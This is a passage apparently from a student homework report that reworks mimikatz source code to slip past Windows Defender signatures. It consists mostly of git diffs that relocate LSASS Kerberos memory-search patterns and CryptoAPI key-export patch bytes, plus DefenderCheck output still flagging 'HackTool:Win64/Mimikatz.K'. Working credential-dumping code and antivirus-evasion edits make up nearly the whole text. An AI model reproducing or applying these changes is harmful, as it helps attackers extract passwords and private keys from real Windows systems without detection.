-	{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN1903_KerbUnloadLogonSessionTable),	PTRN_WN1903_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
-};
-#endif
 
 PVOID KerbLogonSessionListOrTable = NULL;
 LONG KerbOffsetIndex = 0;
@@ -585,6 +549,42 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_pth(IN PKIWI_BASIC_SECURITY
 
 void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKIWI_KERBEROS_ENUM_DATA pEnumData)
 {
+#if defined(_M_ARM64)
+	BYTE PTRN_WALL_KerbUnloadLogonSessionTable[] = { 0x09, 0xfd, 0xdf, 0xc8, 0xe1, 0x03, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6 };
+	KULL_M_PATCH_GENERIC KerberosReferences[] = {
+		{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { -16, 4, 7}},
+	};
+#elif defined(_M_X64)
+	BYTE PTRN_WALL_KerbFreeLogonSessionList[] = { 0x48, 0x3b, 0xfe, 0x0f, 0x84 };
+	BYTE PTRN_WALL_KerbUnloadLogonSessionTable[] = { 0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d };
+	KULL_M_PATCH_GENERIC KerberosReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 0}},
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbFreeLogonSessionList),	PTRN_WALL_KerbFreeLogonSessionList},	{0, NULL}, {-4, 1}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 2}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 3}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 4}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 5}},
+		{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 6}},
+		{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WALL_KerbUnloadLogonSessionTable),	PTRN_WALL_KerbUnloadLogonSessionTable}, {0, NULL}, { 6, 7}},
+	};
+#elif defined(_M_IX86)
+	BYTE PTRN_WALL_KerbReferenceLogonSession[] = { 0x8b, 0x7d, 0x08, 0x8b, 0x17, 0x39, 0x50 };
+	BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[] = { 0x53, 0x8b, 0x18, 0x50, 0x56 };
+	BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[] = { 0x57, 0x8b, 0x38, 0x50, 0x68 };
+	BYTE PTRN_WI10_KerbUnloadLogonSessionTable[] = { 0x56, 0x8b, 0x30, 0x50, 0x57 };
+	BYTE PTRN_WN1903_KerbUnloadLogonSessionTable[] = { 0x56, 0x8b, 0x30, 0x50, 0x53 };
+	KULL_M_PATCH_GENERIC KerberosReferences[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 0}},
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_KerbReferenceLogonSession),	PTRN_WALL_KerbReferenceLogonSession},	{0, NULL}, {-8, 1}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,2}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable),	PTRN_WNO8_KerbUnloadLogonSessionTable}, {0, NULL}, {-11,3}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable),	PTRN_WIN8_KerbUnloadLogonSessionTable}, {0, NULL}, {-14,4}},
+		{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,4}},
+		{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,5}},
+		{KULL_M_WIN_BUILD_10_1511,	{sizeof(PTRN_WI10_KerbUnloadLogonSessionTable),	PTRN_WI10_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
+		{KULL_M_WIN_BUILD_10_1903,	{sizeof(PTRN_WN1903_KerbUnloadLogonSessionTable),	PTRN_WN1903_KerbUnloadLogonSessionTable}, {0, NULL}, {-15,7}},
+	};
+#endif
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, ARRAYSIZE(KerberosReferences), &KerbLogonSessionListOrTable, NULL, NULL, &KerbOffsetIndex))
 	{
diff --git a/files/mimikatz/mimilib/sekurlsadbg/kull_m_rpc_ms-credentialkeys.c b/files/mimikatz/mimilib/sekurlsadbg/kull_m_rpc_ms-credentialkeys.c
index 0ebe949..2d602ba 100644
--- a/files/mimikatz/mimilib/sekurlsadbg/kull_m_rpc_ms-credentialkeys.c
+++ b/files/mimikatz/mimilib/sekurlsadbg/kull_m_rpc_ms-credentialkeys.c
@@ -12,18 +12,20 @@ typedef struct _ms_credentialkeys_MIDL_TYPE_FORMAT_STRING {
 } ms_credentialkeys_MIDL_TYPE_FORMAT_STRING;
 
 extern const ms_credentialkeys_MIDL_TYPE_FORMAT_STRING ms_credentialkeys__MIDL_TypeFormatString;
-static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = {sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000};
 static const MIDL_TYPE_PICKLING_INFO __MIDL_TypePicklingInfo = {0x33205054, 0x3, 0, 0, 0,};
 static RPC_BINDING_HANDLE mscredentialkeys__MIDL_AutoBindHandle;
-static const MIDL_STUB_DESC mscredentialkeys_StubDesc = {(void *) &mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0};
 
 void CredentialKeys_Decode(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType)
 {
+	static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000 };
+	static const MIDL_STUB_DESC mscredentialkeys_StubDesc = { (void *)&mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0 };
 	NdrMesTypeDecode2(_MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO) &__MIDL_TypePicklingInfo, &mscredentialkeys_StubDesc, (PFORMAT_STRING) &ms_credentialkeys__MIDL_TypeFormatString.Format[2], _pType);
 }
 
 void CredentialKeys_Free(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType)
 {
+	static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000 };
+	static const MIDL_STUB_DESC mscredentialkeys_StubDesc = { (void *)&mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0 };
 	NdrMesTypeFree2(_MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO) &__MIDL_TypePicklingInfo, &mscredentialkeys_StubDesc, (PFORMAT_STRING) &ms_credentialkeys__MIDL_TypeFormatString.Format[2], _pType);
 }
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
diff --git a/files/mimikatz/modules/rpc/kull_m_rpc_ms-credentialkeys.c b/files/mimikatz/modules/rpc/kull_m_rpc_ms-credentialkeys.c
index 46fc136..42a2000 100644
--- a/files/mimikatz/modules/rpc/kull_m_rpc_ms-credentialkeys.c
+++ b/files/mimikatz/modules/rpc/kull_m_rpc_ms-credentialkeys.c
@@ -12,18 +12,20 @@ typedef struct _ms_credentialkeys_MIDL_TYPE_FORMAT_STRING {
 } ms_credentialkeys_MIDL_TYPE_FORMAT_STRING;
 
 extern const ms_credentialkeys_MIDL_TYPE_FORMAT_STRING ms_credentialkeys__MIDL_TypeFormatString;
-static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = {sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000};
 static const MIDL_TYPE_PICKLING_INFO __MIDL_TypePicklingInfo = {0x33205054, 0x3, 0, 0, 0,};
 static RPC_BINDING_HANDLE mscredentialkeys__MIDL_AutoBindHandle;
-static const MIDL_STUB_DESC mscredentialkeys_StubDesc = {(void *) &mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0};
 
 void CredentialKeys_Decode(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType)
 {
+	static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000 };
+	static const MIDL_STUB_DESC mscredentialkeys_StubDesc = { (void *)&mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0 };
 	NdrMesTypeDecode2(_MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO) &__MIDL_TypePicklingInfo, &mscredentialkeys_StubDesc, (PFORMAT_STRING) &ms_credentialkeys__MIDL_TypeFormatString.Format[2], _pType);
 }
 
 void CredentialKeys_Free(handle_t _MidlEsHandle, PKIWI_CREDENTIAL_KEYS * _pType)
 {
+	static const RPC_CLIENT_INTERFACE mscredentialkeys___RpcClientInterface = { sizeof(RPC_CLIENT_INTERFACE), {{0xd9ae4745, 0x178e, 0x4561, {0xa5, 0x3f, 0xf0, 0x84, 0xf9, 0x92, 0x13, 0xe5}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000 };
+	static const MIDL_STUB_DESC mscredentialkeys_StubDesc = { (void *)&mscredentialkeys___RpcClientInterface, MIDL_user_allocate, MIDL_user_free, &mscredentialkeys__MIDL_AutoBindHandle, 0, 0, 0, 0, ms_credentialkeys__MIDL_TypeFormatString.Format, 1, 0x60000, 0, 0x8000253, 0, 0, 0, 0x1, 0, 0, 0 };
 	NdrMesTypeFree2(_MidlEsHandle, (PMIDL_TYPE_PICKLING_INFO) &__MIDL_TypePicklingInfo, &mscredentialkeys_StubDesc, (PFORMAT_STRING) &ms_credentialkeys__MIDL_TypeFormatString.Format[2], _pType);
 }
 #if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
```
### 26.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1421824 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x1496EE in the original file
File matched signature: "HackTool:Win64/Mimikatz.K"

00000000   00 00 48 89 5C 24 08 57  48 83 EC 40 48 8B F9 48   ��H?\$�WH?�@H?�H
00000010   8B DA 48 8B CA E8 49 8D  41 20 40 57 48 83 EC 40   ?UH?E�I?A @WH?�@
00000020   48 C7 44 24 20 FE FF FF  FF 48 89 5C 24 50 48 89   H�D$ _���H?\$PH?
00000030   6C 24 58 48 89 74 24 60  00 00 48 8B C4 57 48 83   l$XH?t$`��H?�WH?
00000040   EC 50 48 C7 40 C8 FE FF  FF FF 48 89 58 08 90 90   �PH�@E_���H?X�??
00000050   00 00 48 89 5C 24 08 57  48 83 EC 20 48 8B F9 48   ��H?\$�WH?� H?�H
00000060   8B CA 48 8B DA E8 90 90  00 00 40 57 48 83 EC 40   ?EH?U�??��@WH?�@
00000070   48 C7 44 24 20 FE FF FF  FF 48 89 5C 24 50 48 8B   H�D$ _���H?\$PH?
00000080   DA 48 8B F9 48 8B CA E8  00 00 40 57 48 83 EC 40   UH?�H?E���@WH?�@
00000090   48 C7 44 24 20 FE FF FF  FF 48 89 5C 24 50 48 89   H�D$ _���H?\$PH?
000000A0   74 24 58 49 8B 58 08 48  8B F2 48 8B F9 48 8B CA   t$XI?X�H?�H?�H?E
000000B0   E8 00 FF F7 48 83 EC 50  48 C7 44 24 20 FE FF FF   ����H?�PH�D$ _��
000000C0   FF 48 89 5C 24 60 48 8B  DA 48 8B F9 48 8B CA E8   �H?\$`H?UH?�H?E�
000000D0   00 00 48 89 5C 24 08 48  89 74 24 10 57 48 83 EC   ��H?\$�H?t$�WH?�
000000E0   40 49 8B 58 08 48 8B F2  48 8B F9 48 8B CA E8 00   @I?X�H?�H?�H?E��
000000F0   00 00 49 89 5B 10 49 89  73 18 BB 03 00 00 C0 E9   ��I?[�I?s�����A�
```


## 27.patch
### 27.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
index 3c14293..29bec44 100644
--- a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
+++ b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
@@ -5,55 +5,7 @@
 */
 #include "kuhl_m_crypto_patch.h"
 
-PCP_EXPORTKEY K_RSA_CPExportKey = NULL, K_DSS_CPExportKey = NULL;
 
-BYTE PATC_WIN5_CPExportKey_EXPORT[]	= {0xeb};
-BYTE PATC_W6AL_CPExportKey_EXPORT[]	= {0x90, 0xe9};
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x75};
-BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x0c, 0x0e, 0x72};
-BYTE PTRN_W6AL_CPExportKey_4001[]	= {0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
-BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x0c, 0x0e, 0x0f, 0x82};
-BYTE PTRN_WIN8_CPExportKey_4000[]	= {0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
-BYTE PTRN_W10_1809_CPExportKey_4000[] = {0x0c, 0x00, 0x40, 0x00, 0x00, 0x75};
-KULL_M_PATCH_GENERIC Capi4001References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-4}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W6AL_CPExportKey_4001),	PTRN_W6AL_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
-};
-KULL_M_PATCH_GENERIC Capi4000References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 2}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_CPExportKey_4000),	PTRN_WIN8_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_CPExportKey_4000),	PTRN_W10_1809_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
-};
-BYTE PTRN_WALL_DSS_ExportKey_104[]	= {0x18, 0x04, 0x01, 0x00, 0x00, 0x75};
-KULL_M_PATCH_GENERIC CapiDSS104References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_DSS_ExportKey_104),	PTRN_WALL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
-};
-#elif defined _M_IX86
-BYTE PTRN_WIN5_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x75};
-BYTE PTRN_WIN5_CPExportKey_4000[]	= {0x09, 0x40, 0x0f, 0x84};
-BYTE PTRN_WI60_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x0f, 0x85};
-BYTE PTRN_WIN6_CPExportKey_4001[]	= {0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85};
-BYTE PTRN_WI60_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x0f, 0x85};
-BYTE PTRN_WIN6_CPExportKey_4000[]	= {0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85};
-KULL_M_PATCH_GENERIC Capi4001References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4001),	PTRN_WI60_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4001),	PTRN_WIN6_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
-};
-KULL_M_PATCH_GENERIC Capi4000References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-7}},
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4000),	PTRN_WI60_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
-};
-BYTE PTRN_WIN5_DSS_ExportKey_104[]	= {0x10, 0x04, 0x01, 0x75};
-BYTE PTRN_W6AL_DSS_ExportKey_104[]	= {0x10, 0x04, 0x01, 0x00, 0x00, 0x75};
-KULL_M_PATCH_GENERIC CapiDSS104References[] = {
-	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_DSS_ExportKey_104),	PTRN_WIN5_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 3}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_W6AL_DSS_ExportKey_104),	PTRN_W6AL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
-};
-#endif
 NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 {
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
@@ -66,7 +18,55 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		aPatch104Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemoryRSA = {{{K_RSA_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL}, sMemoryDSS = {{{K_DSS_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000, currentReference104;
-	
+	PCP_EXPORTKEY K_RSA_CPExportKey = NULL, K_DSS_CPExportKey = NULL;
+
+	BYTE PATC_WIN5_CPExportKey_EXPORT[] = { 0xeb };
+	BYTE PATC_W6AL_CPExportKey_EXPORT[] = { 0x90, 0xe9 };
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+	BYTE PTRN_WIN5_CPExportKey_4001[] = { 0x0c, 0x01, 0x40, 0x00, 0x00, 0x75 };
+	BYTE PTRN_WIN5_CPExportKey_4000[] = { 0x0c, 0x0e, 0x72 };
+	BYTE PTRN_W6AL_CPExportKey_4001[] = { 0x0c, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85 };
+	BYTE PTRN_WIN6_CPExportKey_4000[] = { 0x0c, 0x0e, 0x0f, 0x82 };
+	BYTE PTRN_WIN8_CPExportKey_4000[] = { 0x0c, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85 };
+	BYTE PTRN_W10_1809_CPExportKey_4000[] = { 0x0c, 0x00, 0x40, 0x00, 0x00, 0x75 };
+	KULL_M_PATCH_GENERIC Capi4001References[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-4}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W6AL_CPExportKey_4001),	PTRN_W6AL_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
+	};
+	KULL_M_PATCH_GENERIC Capi4000References[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 2}},
+		{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_CPExportKey_4000),	PTRN_WIN8_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
+		{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_CPExportKey_4000),	PTRN_W10_1809_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
+	};
+	BYTE PTRN_WALL_DSS_ExportKey_104[] = { 0x18, 0x04, 0x01, 0x00, 0x00, 0x75 };
+	KULL_M_PATCH_GENERIC CapiDSS104References[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WALL_DSS_ExportKey_104),	PTRN_WALL_DSS_ExportKey_104},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, { 5}},
+	};
+#elif defined _M_IX86
+	BYTE PTRN_WIN5_CPExportKey_4001[] = { 0x08, 0x01, 0x40, 0x75 };
+	BYTE PTRN_WIN5_CPExportKey_4000[] = { 0x09, 0x40, 0x0f, 0x84 };
+	BYTE PTRN_WI60_CPExportKey_4001[] = { 0x08, 0x01, 0x40, 0x0f, 0x85 };
+	BYTE PTRN_WIN6_CPExportKey_4001[] = { 0x08, 0x01, 0x40, 0x00, 0x00, 0x0f, 0x85 };
+	BYTE PTRN_WI60_CPExportKey_4000[] = { 0x08, 0x00, 0x40, 0x0f, 0x85 };
+	BYTE PTRN_WIN6_CPExportKey_4000[] = { 0x08, 0x00, 0x40, 0x00, 0x00, 0x0f, 0x85 };
+	KULL_M_PATCH_GENERIC Capi4001References[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4001),	PTRN_WIN5_CPExportKey_4001},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-5}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4001),	PTRN_WI60_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4001),	PTRN_WIN6_CPExportKey_4001},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
+	};
+	KULL_M_PATCH_GENERIC Capi4000References[] = {
+		{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_CPExportKey_4000),	PTRN_WIN5_CPExportKey_4000},	{sizeof(PATC_WIN5_CPExportKey_EXPORT), PATC_WIN5_CPExportKey_EXPORT}, {-7}},
+		{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_CPExportKey_4000),	PTRN_WI60_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 3}},
+		{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WIN6_CPExportKey_4000),	PTRN_WIN6_CPExportKey_4000},	{sizeof(PATC_W6AL_CPExportKey_EXPORT), PATC_W6AL_CPExportKey_EXPORT}, { 5}},
+	};
+	BYTE PTRN_WIN5_DSS_ExportKey_104[] = { 0x10, 0x04, 0x01, 0x75 };
+	BYTE PTRN_W6AL_DSS_ExportKey_104[] = { 0x10, 0x04, 0x01, 0x00, 0x00, 0x75 };
+	KULL_M_PATCH_GENERIC CapiDSS104References[] = {
